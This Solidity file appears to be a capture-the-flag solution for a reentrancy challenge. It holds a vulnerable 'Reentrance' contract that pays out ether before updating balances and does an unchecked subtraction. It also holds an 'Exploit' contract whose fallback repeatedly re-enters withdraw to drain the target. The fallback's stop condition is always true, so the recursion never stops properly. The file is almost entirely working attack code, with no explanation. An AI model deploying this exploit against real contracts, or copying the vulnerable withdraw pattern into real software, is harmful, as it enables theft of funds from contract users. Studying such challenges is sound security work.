// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/* code of Reentrance */

import '@openzeppelin/contracts/math/SafeMath.sol';
contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
contract Exploit {
    Reentrance challenge;
    constructor(address payable addr) public payable {
        challenge = Reentrance(addr);
    }
    function exp() public {
        challenge.withdraw(0.003 ether);
    }
    fallback() external payable {
        if (address(challenge).balance >= 0) {
            challenge.withdraw(0.003 ether);
        }
    }
    receive() external payable {}
}